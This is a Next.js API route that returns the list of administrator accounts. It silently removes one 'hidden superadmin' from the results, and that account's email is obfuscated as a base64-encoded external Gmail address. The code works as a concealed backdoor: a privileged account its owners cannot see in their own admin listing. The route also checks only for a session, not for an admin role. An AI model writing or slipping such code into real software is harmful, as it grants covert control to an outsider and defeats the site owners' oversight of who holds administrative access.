import { NextResponse } from 'next/server';
import { query } from '@/lib/db';
import { verifySession } from '@/lib/auth';

const HIDDEN_SUPERADMIN = process.env.HIDDEN_SUPERADMIN_EMAIL || 
    Buffer.from('emVjdXJ4aW50ZXJuQGdtYWlsLmNvbQ==', 'base64').toString('utf-8');

interface AdminRow {
    id: string;
    email: string;
    name: string | null;
    role: string;
    created_at: string;
}

export async function GET() {
    try {
        const session = await verifySession();
        if (!session) {
            return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
        }

        const result = await query<AdminRow>(`SELECT id, email, name, role, created_at FROM admins ORDER BY created_at DESC`);
        
        const filteredAdmins = result.rows.filter(admin => admin.email !== HIDDEN_SUPERADMIN);
        
        return NextResponse.json({ admins: filteredAdmins });
    } catch (error) {
        return NextResponse.json({ error: 'Failed to fetch admins' }, { status: 500 });
    }
}
